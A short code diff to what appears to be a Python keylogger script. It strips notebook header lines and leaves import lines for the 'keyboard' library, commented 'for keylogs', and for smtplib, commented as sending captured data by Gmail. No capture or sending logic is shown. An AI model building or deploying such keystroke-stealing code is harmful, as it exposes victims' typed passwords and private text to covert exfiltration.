@@ -1,8 +1,3 @@
-#!/usr/bin/env python
-# coding: utf-8
-
-# In[ ]:
-
 import keyboard # for keylogs
 import smtplib # for sending email using SMTP protocol (gmail)
 from threading import Timer
